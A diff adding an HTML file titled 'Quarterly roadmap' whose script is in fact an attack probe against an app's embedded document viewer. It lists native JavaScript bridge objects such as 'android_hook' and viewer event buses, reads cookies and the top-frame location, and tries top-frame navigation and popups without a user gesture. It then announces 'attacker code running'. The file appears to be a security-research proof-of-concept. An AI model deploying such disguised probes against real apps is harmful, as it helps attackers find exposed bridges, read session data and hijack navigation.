@@ -1,0 +1,29 @@
+<!doctype html><meta charset=utf-8><title>Quarterly roadmap</title>
+<body style="font:14px system-ui;background:#fff;margin:0">
+<div style="padding:14px">
+<h2 id=h>measuring…</h2>
+<pre id=o style="white-space:pre-wrap;font-size:12px"></pre>
+</div>
+<script>
+// Self-contained capability probe. No external network calls.
+var BR=['CommentEventBus','CommonViewerEventBus','FileViewerEventBus','MakeViewerEventBus',
+ 'MirrorViewerEventBus','MobileApp','NativeLoaderEventBus','PlayableViewerEventBus',
+ 'PrototypeViewerEventBus','SlideDeckViewerEventBus','SlideViewerEventBus','android_hook'];
+var present=[];
+for (var i=0;i<BR.length;i++){ try{ var o=window[BR[i]];
+  if(o){ var m=[]; for(var k in o){ try{ if(typeof o[k]==='function') m.push(k); }catch(e){} }
+    present.push(BR[i]+'#'+m.length); } }catch(e){} }
+var R={};
+R.origin=location.origin;
+R.referrer=document.referrer;
+R.isTopFrame=(window===window.top);
+R.androidJsBridges=present.length?present.join('|'):'NONE';
+try{ R.readTopLocation=String(window.top.location.href).slice(0,60); }catch(e){ R.readTopLocation='BLOCKED ('+e.name+')'; }
+try{ R.ownCookie=document.cookie; }catch(e){ R.ownCookie='ERR'; }
+try{ window.top.location.href='https://example.com/topnav-probe'; R.topNavWithoutGesture='ALLOWED'; }
+catch(e){ R.topNavWithoutGesture='BLOCKED ('+e.name+')'; }
+try{ var w=window.open('about:blank','_blank'); if(w){ R.popupWithoutGesture='ALLOWED'; w.close(); } else R.popupWithoutGesture='BLOCKED (null)'; }
+catch(e){ R.popupWithoutGesture='BLOCKED ('+e.name+')'; }
+document.getElementById('o').textContent=JSON.stringify(R,null,1);
+document.getElementById('h').textContent='attacker code running, origin '+R.origin;
+</script></body>
